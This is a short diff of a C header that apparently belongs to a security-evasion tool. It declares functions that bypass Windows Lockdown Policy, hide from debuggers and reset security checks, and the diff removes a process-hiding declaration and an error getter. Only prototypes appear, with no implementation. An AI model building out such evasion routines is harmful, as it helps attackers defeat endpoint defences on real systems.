@@ -21,10 +21,8 @@ bool DefensePatchWLDP(void);          /* Bypass Windows Lockdown Policy */
 
 /* Phase 3: Runtime Hiding */
 bool DefenseHideFromDebugger(void);
-bool DefenseHideProcessFromToolhelp(void);
 
 /* Phase 4: Cleanup & Reporting */
 void DefenseResetSecurityChecks(void);
-int DefenseGetLastError(void);
 
 #endif
